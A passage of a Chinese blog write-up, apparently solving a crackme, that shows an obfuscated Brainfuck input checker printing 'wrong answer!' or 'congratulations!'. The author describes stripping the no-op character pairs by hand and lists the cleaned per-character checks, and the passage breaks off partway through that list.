&quot;..-[..-]&gt;-],],+]+]+[+&gt;[&lt;&gt;+-.-[+[.+-]+&gt;&gt;&lt;&lt;-]],]&lt;]+-&gt;&lt;-+&lt;&gt;][.[,,-&gt;+&lt;],-+]-+,&gt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;-++&gt;&lt;-++-+-&gt;&lt;++&lt;&gt;&quot;</span><br><span class="line">    &quot;+-&lt;&gt;++-++-++-+&lt;&gt;[+-+-&lt;&lt;&gt;-&gt;&lt;+--+--+--+&lt;&gt;+--&gt;&lt;-+&lt;&gt;--+-+-&gt;&lt;&lt;&gt;-+-&lt;&gt;&gt;&lt;+--+&gt;-++---+][&lt;+&lt;+]&lt;&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;-+-+&quot;</span><br><span class="line">    &quot;-&gt;&lt;+-+-[&gt;&lt;&lt;&gt;&lt;+--+&lt;&gt;-++&lt;&gt;+-&gt;[+-+-+-+--&lt;&gt;-+-+&lt;&gt;-+]&lt;&gt;+-&lt;&gt;-+]&lt;&gt;-++-,&gt;&lt;&lt;&gt;&lt;&gt;&gt;+-+-++&gt;&lt;&lt;&gt;+--++-+-+&gt;&lt;++[-++-&lt;&quot;</span><br><span class="line">    &quot;-+-+&gt;&lt;-+-+-&lt;&gt;&lt;&gt;--+&lt;&gt;+--++--&gt;&lt;+--+--+&lt;&gt;&lt;&gt;+-+---++-&lt;&gt;&gt;&lt;&gt;&lt;----&gt;&lt;--++-&gt;-+&lt;&gt;-+-+-&lt;&gt;]&gt;&lt;&lt;&gt;-+&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;-&lt;&gt;[-+&quot;</span><br><span class="line">    &quot;+-+-&lt;+--++-++-&gt;[-+-&gt;&lt;&gt;&lt;-+]&gt;&lt;-+][+&gt;[+&lt;,[+[,+[,&lt;&lt;,+,]&lt;.],-&gt;]+&gt;]-]+--+-++-,+--+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+++-++-&gt;&lt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&lt;&gt;++-++-&lt;&gt;&gt;&lt;+--+++-&gt;&lt;+-+-++-&gt;&lt;+-+&lt;&gt;&lt;&gt;+-+&lt;&gt;&gt;&lt;[&lt;&gt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;+-&gt;&lt;+---&gt;&lt;-+-+--&lt;&gt;&gt;&lt;&gt;&lt;--+-+-+----&gt;-]+&quot;</span><br><span class="line">    &quot;-&lt;&gt;&lt;&lt;&gt;&lt;&gt;--+&gt;&lt;+-&gt;&lt;&gt;&lt;--++-+-&gt;&lt;--&lt;&gt;--+-+&gt;&lt;&lt;&gt;--+&gt;&lt;&gt;&lt;-[&lt;&lt;&gt;&lt;&gt;&lt;&gt;+-+&gt;&lt;&gt;[-]&lt;&gt;&gt;&lt;-+][.-&gt;[[&lt;.-.&gt;].+[,[&lt;[,&lt;-[.&gt;+-&quot;</span><br><span class="line">    &quot;],.&gt;+&lt;]+[[[,]],&lt;+++]&gt;-]&lt;-]&gt;+&lt;].&lt;&lt;[&lt;&gt;-,&gt;&gt;]],+-&gt;&lt;&gt;-++-+-+&lt;&gt;&lt;&gt;+-+++-+++-[&lt;&gt;&gt;&lt;&lt;&lt;&gt;+--&lt;&gt;&lt;&gt;-&gt;&lt;--+-++-&gt;&lt;&lt;&gt;-+&quot;</span><br><span class="line">    &quot;-&lt;&gt;-+-+&lt;&gt;--&gt;&lt;&gt;&lt;-+-&gt;&lt;&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;&gt;-+-&gt;&lt;&lt;&gt;&lt;&gt;-+--+-+&gt;&lt;-+&gt;&lt;-+-&gt;&lt;&lt;&gt;&gt;+--&gt;&lt;&gt;&lt;+-]&gt;&lt;&lt;+--[-+-+&lt;&gt;-+&lt;+--++&quot;</span><br><span class="line">    &quot;-&gt;&lt;+-+&gt;&lt;&lt;&gt;-+&lt;&gt;+-&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;[-+&lt;&gt;-&lt;&gt;&lt;&gt;-+&gt;&lt;][,-+&gt;---]&lt;&gt;-++-+-&gt;&lt;][,-],&gt;&lt;-+-+&gt;+-++--+&gt;&lt;+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;+-++-++-&lt;&gt;&quot;</span><br><span class="line">    &quot;+-+-&lt;&gt;+&gt;&lt;++--+++[&gt;&lt;-+&lt;&gt;-+-+&lt;&gt;&lt;-+-+-+-&gt;&lt;-&lt;&gt;&lt;&gt;&lt;&gt;-&gt;&lt;-+&gt;&lt;-&lt;&gt;-&gt;&lt;&gt;&lt;+-+-&gt;&lt;-&lt;&gt;+--+-+--&lt;&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;-+-&gt;&lt;+-&gt;&lt;&lt;&gt;-&quot;</span><br><span class="line">    &quot;+--+---+-+&gt;&lt;+-&gt;&lt;&gt;+--+-&gt;&lt;-+-+-+]&lt;+-+-+---&gt;&lt;&gt;&lt;-+--++--&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;-+-&gt;&lt;-+[&lt;-+-++-+&gt;&lt;&lt;&gt;&gt;-++-&lt;&gt;[&gt;&lt;&gt;&lt;+-+---&quot;</span><br><span class="line">    &quot;+][.-[[.,-[&gt;&lt;&gt;[&lt;&gt;,.+]-+&gt;],&gt;,[,&gt;-[+&lt;+[[,-+,[&gt;[&lt;+[+&lt;+,]&gt;-.[-.-.]&lt;.-]++]&gt;&lt;,]&gt;&gt;[[.-,+&gt;]+&lt;-]]&gt;+],.]]--&gt;,-&quot;</span><br><span class="line">    &quot;]+&lt;.&lt;]-+&lt;&gt;+-&gt;&lt;]+-+-,-+-+&gt;&lt;+-&gt;-+&lt;&gt;+&lt;&gt;+&lt;&gt;+-&lt;&gt;+-+&gt;&lt;&lt;&gt;&lt;&gt;+&lt;&gt;-++-++--++-&lt;&gt;+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+&gt;&lt;+&lt;&gt;+-+&gt;&lt;+-+&lt;&gt;[&gt;&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;+-&lt;&gt;&lt;-&lt;&gt;&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;-+&lt;&gt;--+&gt;&lt;-&gt;&lt;+-+-&lt;&gt;+-&gt;-+-+-&lt;&gt;-+][]&lt;--+-&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;+-+-+--&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;+-&gt;&lt;--&lt;&gt;-+&quot;</span><br><span class="line">    &quot;&lt;&gt;&gt;&lt;+--&gt;&lt;&gt;&lt;+---+&lt;&gt;+--+-+[-++--++-+-&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-+&gt;&lt;&gt;&lt;-+[&gt;&lt;--++-+-]+-&gt;&lt;-++-][&lt;+[&lt;..]]&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;,&lt;&gt;&gt;&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;&gt;&lt;+++-&gt;&lt;&gt;&lt;-+++-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;+-+++&lt;&gt;+-&gt;&lt;[&gt;&lt;+--+&gt;&lt;&gt;&lt;&lt;-+-++-&gt;&lt;-&gt;&lt;+-&lt;&gt;+-&gt;&lt;--+-++-&gt;&lt;-&gt;&lt;&lt;&gt;--++---+-+-&lt;&gt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&lt;-+-+-&gt;&lt;-&lt;&gt;-+-&lt;&gt;+--&lt;&gt;-&lt;&gt;--&gt;&lt;-+&lt;&gt;&gt;&lt;&gt;&lt;--+&lt;&gt;-+&gt;&lt;&gt;-][&gt;&gt;[[[&gt;-[++-[,.--,+-]--[&gt;[.-&gt;&gt;],.,[.-&gt;]]&lt;.&lt;],-[,+&lt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&gt;],.]+,&gt;[&gt;-[+&lt;&lt;]&gt;]]--,]---]&gt;&lt;&lt;&gt;&lt;-+---++--++--+-&gt;&lt;-+[+-&lt;-+&gt;&lt;+-+&lt;&gt;&gt;&lt;-+&gt;&lt;&gt;&lt;&gt;&gt;&lt;[+-&gt;&lt;-+-+-+-][.-&lt;-[&lt;[,&gt;[&quot;</span><br><span class="line">    &quot;]--.++&lt;].-.&gt;+]]]&lt;&gt;,&gt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;+&gt;&lt;-++&gt;&lt;&gt;&lt;+&lt;&gt;&gt;&lt;+-&lt;&gt;+&lt;&gt;-+-++&gt;&lt;&lt;&gt;+-&gt;&lt;++-&lt;&gt;+-++--+++-++-&gt;&lt;[&lt;&gt;&lt;--+&lt;&gt;+--&lt;&gt;&gt;&lt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&lt;&gt;-+--&gt;&lt;&lt;&gt;&lt;&gt;-+--&gt;&lt;&lt;&gt;-+--+&gt;&lt;-+-+--++--&gt;&lt;&lt;&gt;-&lt;&gt;+-&lt;&gt;--+&lt;&gt;&gt;-+-+--+&gt;&lt;]&lt;&gt;&lt;&gt;&lt;&gt;&lt;-&lt;&gt;[&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;-++&gt;&lt;&gt;&gt;&lt;&lt;&gt;+-&lt;&quot;</span><br><span class="line">    &quot;&gt;[+-&gt;&lt;+--]+--++-&lt;&gt;]+-&lt;&gt;&gt;&lt;-+,-+&lt;&gt;+-&gt;&lt;&lt;&gt;&gt;+-+-+&gt;&lt;+&lt;&gt;&gt;&lt;-+-+++-+-&lt;&gt;-+-+++-+++--++-&lt;&gt;&gt;&lt;+-+[+-&lt;+-+--+-&gt;&lt;-&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&lt;&gt;&lt;--+-+--&lt;&gt;-+---+&gt;&lt;&gt;&lt;-+-+--&gt;&lt;-&gt;&lt;-+-+&gt;&lt;--+&gt;&lt;-+--&gt;&lt;&lt;&gt;--+-++--+&lt;&gt;&gt;&lt;&gt;+--+-&lt;&gt;]+-&lt;&gt;&lt;&gt;-+&lt;-+-+-&gt;&lt;&lt;&gt;+-&lt;&gt;-+[&quot;</span><br><span class="line">    &quot;&lt;&gt;-+-+&gt;&lt;&lt;-++-&lt;&gt;+-+-++-+-&gt;&lt;&gt;-+&lt;&gt;&gt;&lt;[&lt;&gt;-+-&gt;&lt;+-][[+&gt;.[,-+]&lt;[&lt;[&gt;,+.-,][&lt;+&gt;[-,,,[&lt;,+[&lt;&lt;+[+.-,[,+]&gt;.+]-+-[&lt;&quot;</span><br><span class="line">    &quot;.&lt;[&gt;.[...-],]+&gt;[+--[&gt;---,]&gt;-&lt;[-,&lt;&gt;]...].]+&lt;][&lt;&lt;[&gt;&lt;+&lt;-[+&lt;[&gt;-.+&lt;&gt;&gt;]+,]+&gt;,]]]&lt;,]+-,]&lt;+].--]&lt;]+-+-+--+]&gt;&quot;</span><br><span class="line">    &quot;&lt;+--+&lt;&gt;&gt;&lt;,+-+-&gt;&lt;-+-+&gt;+&gt;&lt;-+-++-&lt;&gt;++&lt;&gt;&gt;&lt;+&lt;&gt;-+-++&lt;&gt;+&lt;&gt;[-+-+&lt;-+-++-&gt;&lt;--+&lt;&gt;-&gt;&lt;&lt;&gt;+--&lt;&gt;-&gt;&lt;--+--+-+-+&lt;&gt;&lt;&gt;-+-&quot;</span><br><span class="line">    &quot;&lt;&gt;+-&gt;&lt;+--+-&gt;&lt;-&lt;&gt;-+-+&gt;&lt;-+&gt;-&gt;&lt;-+-++--+]-+-+-+&lt;+--++-&gt;&lt;+--&gt;&lt;&lt;&gt;-+&gt;&lt;[&lt;+-+--+&gt;&lt;+&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;+--+&gt;&lt;-++-[&lt;&gt;&lt;&gt;-+&quot;</span><br><span class="line">    &quot;--+&lt;&gt;-+][+&gt;[-.&lt;[[+[+-&gt;,+.,&gt;]&gt;+-]&gt;[+[++,&gt;[,,[+[.&lt;&gt;&gt;.[&gt;,]+]&lt;&lt;]-.&gt;+-]&gt;-].-&gt;++],]&gt;[&gt;[.[-&gt;&lt;+&gt;.+],].,[&lt;[-&lt;&quot;</span><br><span class="line">    &quot;,[[[&gt;&lt;-,&gt;]-]+[,,-[.&lt;[+&lt;[&lt;,-,-]+,+][[.,-&gt;]+[--,&lt;+]&gt;]&lt;]+.--],.&gt;]].[--[&gt;.&lt;[-+[,&gt;...,]-,]&lt;&lt;[[+-&lt;&lt;&gt;]&gt;.]&lt;]&quot;</span><br><span class="line">    &quot;.+&gt;]-]-.]+],&lt;&gt;]&gt;&lt;+-&lt;&gt;&lt;&gt;][&gt;,[,-[[..[..,&lt;[.--]-,&gt;]+&lt;[[,.[+&gt;&lt;[[&lt;+-+&gt;[+]&lt;&lt;]---[..[,+-&lt;].&gt;&lt;],&lt;]]]+-.&gt;]&gt;]-&quot;</span><br><span class="line">    &quot;&gt;+],,&gt;[-,.&gt;].]&gt;-&gt;],+--+-+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;-+-++-++-+&gt;&lt;+-&gt;&lt;&gt;&lt;+&gt;&lt;+--+-+&lt;&gt;+&lt;&gt;[&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&lt;&lt;&gt;&gt;&lt;+--+-+-&gt;&lt;&gt;&lt;+-&quot;</span><br><span class="line">    &quot;---++--+-&gt;&lt;&lt;&gt;-+&gt;&lt;&gt;&lt;-+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;-+-+-&gt;&lt;-&gt;&lt;-+-&gt;&lt;+-&gt;&lt;-&gt;&lt;&gt;&lt;&gt;&lt;&gt;+-&lt;&gt;-&lt;&gt;+-]-+&lt;&gt;+-&gt;&lt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;&lt;&gt;-+-+-[-+-+&gt;&lt;+&quot;</span><br><span class="line">    &quot;-&lt;+-+-+-+-+-+&gt;[+--+&gt;&lt;&gt;&lt;-]][[[,[,,-,,.][.+--&gt;+&lt;],]++&gt;&gt;&lt;,]-]&gt;&lt;-+&lt;&gt;-+&gt;&lt;,&gt;+&gt;&lt;&gt;&lt;&lt;&gt;+&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;++&lt;&gt;++-&lt;&gt;&lt;&gt;+-[&quot;</span><br><span class="line">    &quot;-+-+&gt;&lt;&lt;-+-&lt;&gt;&lt;&gt;+--+-+--+-+&gt;&lt;&lt;&gt;&gt;&lt;--+&lt;&gt;+-+--+-+---+-+&gt;&lt;&gt;&lt;-+-&gt;&lt;-+&gt;&lt;-+-+-+--+-+--+&lt;&gt;-+---&lt;&gt;&lt;&gt;--+&gt;&lt;&lt;&gt;+-&gt;&lt;-&quot;</span><br><span class="line">    &quot;---+&gt;&lt;&gt;&lt;&lt;&gt;-&gt;&lt;+-&lt;&gt;--&lt;&gt;-&lt;&gt;&gt;&lt;&lt;&gt;--++-&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;+--]&lt;&gt;&lt;&gt;&lt;-++--+--&gt;&lt;&lt;&gt;&gt;&lt;[&lt;+&lt;&gt;&gt;[&gt;&lt;+-+--][-&gt;[-]&lt;[&gt;&gt;-&lt;..].+]&quot;</span><br><span class="line">    &quot;&lt;&gt;-+-+&gt;&lt;-+][[&gt;+-]+.+,]+-+-,&gt;&lt;&gt;++&lt;&gt;+-&lt;&gt;+&gt;&lt;+--++-++-++++-&lt;&gt;-+&lt;&gt;+-+&gt;&lt;-++-+-[-+&lt;-&lt;&gt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;--+&lt;&gt;-+&gt;&lt;-&gt;&lt;&quot;</span><br><span class="line">    &quot;-+-++--+---++-&gt;&lt;-+-+----+&lt;&gt;+--&gt;&lt;-+-+-+-&lt;&gt;&lt;&gt;-+-&lt;&gt;-+&gt;&lt;-+&gt;+-&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;&lt;&gt;-+&gt;&lt;]-++-&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;-&lt;&gt;+--+&lt;&gt;-&gt;&lt;-&gt;&quot;</span><br><span class="line">    &quot;&lt;&lt;&gt;[&lt;&gt;-++-&lt;+-&gt;&lt;&lt;&gt;+&gt;+-+-[-]-+&gt;&lt;&lt;&gt;]&lt;&gt;&lt;&gt;&lt;&gt;,-++-&lt;&gt;+-&gt;-+&gt;&lt;+-&lt;&gt;&gt;&lt;++&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&lt;+&gt;&lt;&gt;&lt;&lt;&gt;+-+&gt;&lt;-++-&lt;&gt;[+-&lt;-&lt;&gt;-&quot;</span><br><span class="line">    &quot;+--&lt;&gt;-+-+&gt;&lt;&lt;&gt;-&lt;&gt;+---+--+--+&gt;&lt;+--+-+-&gt;&lt;&lt;&gt;-+--+&lt;&gt;--+&gt;&lt;&lt;&gt;&gt;&lt;-+--+&lt;&gt;-&gt;&lt;-+-&lt;&gt;-+-&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;+-&gt;&lt;--+&lt;&gt;+-+----+&quot;</span><br><span class="line">    &quot;-+-+-&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-&gt;&lt;&gt;&lt;&gt;-++-&gt;&lt;-]-+&gt;&lt;+-&gt;&lt;&lt;&lt;&gt;--+--+&gt;&lt;-+[&lt;&gt;&lt;+-++-&lt;&gt;&gt;&gt;&lt;-++-&lt;&gt;[+-&lt;&gt;-&gt;&lt;+-&gt;&lt;&gt;&lt;][+[[[,--[[[+.&gt;&lt;&quot;</span><br><span class="line">    &quot;]-&gt;]&lt;-&lt;.]&gt;&lt;[-[-&gt;&gt;&gt;[&lt;&lt;&gt;[+,&gt;[,+[++-]+.&gt;][-&gt;&lt;..],]&lt;&gt;[,,.[&lt;,-[+]&gt;+&gt;&lt;+]-,+]++]&lt;],].&gt;&lt;][+,&gt;,-[&lt;,.[&lt;&lt;[-[+-,&quot;</span><br><span class="line">    &quot;&lt;-].[++.[[.--]&gt;-[&lt;&lt;]+],-]+--]&gt;,,[&gt;[-[,.&lt;].[[&lt;&lt;&lt;+,]&lt;-]+]-&gt;&lt;].&lt;].&gt;,]&gt;&lt;]&lt;]&lt;[[,&lt;[-&gt;].-]--]+]-[+.-]]+-&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;&gt;&lt;-+]+-,+-&lt;&gt;+-&lt;&gt;&gt;+-++&lt;&gt;&lt;&gt;-++-+&lt;&gt;&gt;&lt;+&lt;&gt;&gt;&lt;+-++++&lt;&gt;+-&lt;&gt;&gt;&lt;+&lt;&gt;+-[&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;-+-&gt;&lt;+-&gt;&lt;-&gt;&lt;--&gt;&lt;+-&gt;&lt;&gt;&lt;--+&gt;&lt;&gt;-]&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&lt;&lt;+-+-+-+---++--+-+--+&gt;&lt;+---++-&gt;&lt;+-&gt;&lt;-&gt;&lt;-+&lt;&gt;&gt;&lt;-+-&lt;&gt;&gt;&lt;+--+-&lt;&gt;&lt;&gt;&gt;&lt;-++--[+-&lt;&gt;&lt;-+&gt;&lt;+-+&lt;&gt;&gt;&gt;&lt;+-&lt;&gt;[&gt;&lt;-&lt;&gt;&lt;&quot;</span><br><span class="line">    &quot;&gt;-+-+]&lt;&gt;-+][.[,&lt;&lt;-&gt;.]&gt;-+],+-&lt;&gt;&gt;&lt;&gt;-+-+-+++-+&lt;&gt;&lt;&gt;&lt;&gt;-+++--++-++-&lt;&gt;&gt;&lt;&lt;&gt;++-+-+++--+&lt;&gt;-++[+--+&lt;-+-++---+&gt;&lt;&quot;</span><br><span class="line">    &quot;-+-&lt;&gt;+-+-&gt;&lt;-&gt;&lt;&lt;&gt;&lt;&gt;-+-+--+&gt;&lt;&gt;&lt;-&lt;&gt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;+-+--&lt;&gt;+--+-&lt;&gt;-&gt;&lt;+-+--&lt;&gt;+-&gt;&lt;&gt;&lt;-+--+-+&lt;&gt;-&gt;-&gt;&lt;&lt;&gt;+--+][]+--+&quot;</span><br><span class="line">    &quot;&gt;&lt;&lt;-&lt;&gt;-+-[&lt;&gt;+-&lt;&gt;&lt;&gt;&lt;+-+--++-+&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;-+&lt;&gt;[&gt;&lt;&lt;&gt;-][-[&gt;-,-[&lt;+&gt;,-,]&gt;-,]]][&gt;[-,[.&gt;+.][--++&lt;&gt;].]-[+-&lt;+]+&quot;</span><br><span class="line">    &quot;..]&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;,&gt;&lt;+-&gt;&lt;-+&gt;&lt;&gt;+&lt;&gt;+++--+++&gt;&lt;-+-+&lt;&gt;+-+-+[+-+-+-&gt;&lt;&lt;+-&lt;&gt;+--&lt;&gt;&gt;&lt;-&gt;&lt;-+&gt;&lt;-+---+&lt;&gt;-+--&gt;&lt;--+&lt;&gt;-&gt;&lt;&gt;&lt;-&quot;</span><br><span class="line">    &quot;&lt;&gt;+--+&gt;&lt;+--&gt;&lt;&gt;&lt;+-&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;-+-&gt;&lt;-&gt;&lt;-+--+&lt;&gt;&gt;&lt;&lt;&gt;--++--+&gt;&lt;--+-+&gt;&lt;-+-&lt;&gt;&gt;&lt;&lt;&gt;-+--+-&gt;&lt;-&gt;+-&gt;&lt;+--&gt;&lt;+--+&lt;&gt;]-+&gt;&lt;&quot;</span><br><span class="line">    &quot;&lt;&gt;+-&lt;+-----+-&gt;&lt;-+-[&lt;+&gt;&lt;&lt;&gt;+-&gt;&gt;&lt;+-&lt;&gt;+--+[--+&lt;&gt;+-]]+&gt;&lt;-+&lt;-+[+-w&gt;&lt;-+&lt;&gt;r+-&gt;&lt;&lt;&gt;o&gt;&lt;-++-+-n-+-+g a-++-n&lt;&gt;s&gt;&lt;&quot;</span><br><span class="line">    &quot;-+&lt;&gt;w-+&lt;&gt;&gt;&lt;+-e&gt;&lt;r-++-&gt;&lt;-+-+!&gt;&lt;-+-+&gt;&lt;&gt;-++-&lt;&gt;&gt;&lt;&lt;&gt;[+-&gt;&lt;&lt;&gt;--+][+[+[[.[&gt;[+,,[&gt;&lt;[[+&gt;+&lt;++]+&lt;&gt;,+],,&gt;&gt;&gt;]+],+.&quot;</span><br><span class="line">    &quot;,+].],+,[-,-[.-+]--,&gt;,-].&lt;][-.[+&lt;[[&gt;-+[[.,+&lt;-[,..-&gt;],,+]--+[.--&lt;]][.[+&gt;,[&lt;+-[.+&gt;,&gt;.+,]&gt;&lt;,]&lt;&gt;]+[&gt;+-&lt;+&quot;</span><br><span class="line">    &quot;+]&gt;]&gt;]&gt;+-]&lt;++[&gt;&gt;&gt;+&gt;-.]&gt;+-]&gt;]],&gt;.[&lt;,&lt;&gt;&lt;+-.]++&lt;]+--++-&lt;&gt;+-&lt;-+&gt;&lt;[+--+-+-&lt;&gt;-+]&lt;&gt;][--++&gt;...,]-+&gt;&lt;&gt;&lt;+-&gt;[&lt;&gt;&quot;</span><br><span class="line">    &quot;&lt;&gt;&gt;&lt;-+c&lt;&gt;&lt;&gt;+-&gt;&lt;&gt;&lt;o&gt;&lt;-+&lt;&gt;-+n&gt;&lt;&lt;&gt;-++-g&lt;&gt;ra&gt;&lt;+-+-t+-&gt;&lt;-+&lt;&gt;&gt;&lt;ul&lt;&gt;at&lt;&gt;&gt;&lt;-++-io&lt;&gt;ns-+!-+&gt;&lt;-++-[&lt;&gt;+--+&lt;&gt;&gt;&lt;-&quot;</span><br><span class="line">    &quot;&gt;&lt;&gt;&lt;-+][&lt;.+&gt;.+]][]&quot;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看上去很复杂，并且我不会写脚本去混淆啥的，只能手动去混淆了。代码部分拖到sublime里，然后搜索<code>&gt;&lt;</code> <code>&lt;&gt;</code> <code>+-</code> <code>-+</code>，全部重复删个几遍。有很多输入应该是无效的，发现有效的输入会是类似<code>,&gt;++++++++[&lt;-------&gt;-]</code>这样的，然后排列了一下，得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&gt;,&gt;+++++[&lt;--------------------&gt;-]&lt;----[&lt;+&gt;[-][.&gt;&gt;[&lt;-,[[+[-&lt;.[-]-,+].[&lt;,[[&lt;,--[,&gt;[,&lt;+,.,]]+]&lt;.-].[&gt;[-.,.,[&lt;[&lt;-[&gt;.&lt;,.+&lt;]-..].,.[+[+][.,.&gt;,]]-]-.]+&gt;,]]&gt;]&gt;,.&gt;][&lt;,[&lt;[&lt;-&gt;[-.-.-]-]&lt;&lt;[.+[[&gt;,-[&lt;.&lt;[&gt;-&lt;.&lt;]+&lt;]&lt;,[&lt;..+],&gt;+]+,]&lt;--]-.]+..[.&lt;-[,&lt;[.[,&lt;[,,.]&lt;&lt;+].[--[-..&gt;[-&lt;..]&lt;-]+.]-]-&lt;,&lt;]-]-.&gt;],]-&lt;]][.-.[,[,+&gt;,&gt;][++[+[.[&gt;[&lt;,].]-[&gt;,],,]+,[.--[+,-,-]+,+]-&lt;&lt;].]]]</span><br><span class="line">,&gt;+++++[&lt;--------------------&gt;-]&lt;---[&lt;+&gt;[-][.[&gt;&gt;+[&lt;&lt;,&lt;.&gt;[+&lt;.]+]&lt;[.&lt;.+[,[.,.+]..+]&gt;,-]-]&gt;--]]</span><br><span class="line">,&gt;+++++[&lt;-------------------&gt;-]&lt;--[&lt;+&gt;[-][,&gt;&gt;]]</span><br><span class="line">,&gt;+++++++[&lt;---------------&gt;-][-[.&gt;[,,&lt;[.,.[,[&gt;[.,+].-][&lt;.[&gt;[,&lt;[+]&gt;[-[.&lt;&lt;+.-]-[&gt;],]+][[+&gt;[&lt;,&lt;]]]++]++++]][+[&lt;[&gt;+.,-]-,+]&lt;]].+]-,++].-,]&lt;----[&lt;+&gt;[-]]</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-][[&gt;[&gt;[+.[.[-[[,,++.[&lt;-[.+,&lt;]&lt;.&lt;]&gt;]]&gt;-,,].,]+&lt;]-,,&lt;][+.&gt;].],+]&lt;--[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++++[&lt;---------------&gt;-][..,,]&lt;---[&lt;+&gt;[-]][&gt;]</span><br><span class="line">,&gt;++++++++[&lt;------------&gt;-][&gt;&gt;-]&lt;-----[&lt;+&gt;[-][[[--.[-.-&gt;[&lt;,.,[++&gt;]]&lt;]-.[.,[.]&gt;[&lt;[[&gt;&gt;-][&gt;-.[,+&lt;&lt;[[--,+,],&gt;[-&gt;-].,+]++&lt;]&lt;[-.[[+,+&lt;]&gt;[-&lt;.+]&gt;&gt;],[-,[&lt;]+&lt;]&lt;.]]-].]]],++]-&gt;[.-[,[-.&lt;&lt;.,].-[,-[,++]+,]]&gt;-&lt;]--&gt;]]</span><br><span class="line">,&gt;+++++++++[&lt;-----&gt;-]&lt;------[&lt;+&gt;[-][[&lt;&lt;[,-.[&lt;+,&lt;]&gt;+],&lt;-,]+.++,.]]</span><br><span class="line">,&gt;++++++[&lt;--------&gt;-]&lt;-----[&lt;+&gt;[-]]</span><br><span class="line">,&gt;++++++[&lt;----------------&gt;-]&lt;-[&lt;+&gt;[-][,&lt;+,]]</span><br><span class="line">,&gt;+++++++++[&lt;-----------&gt;-][-&gt;]&lt;--[&lt;+&gt;[-]]</span><br><span 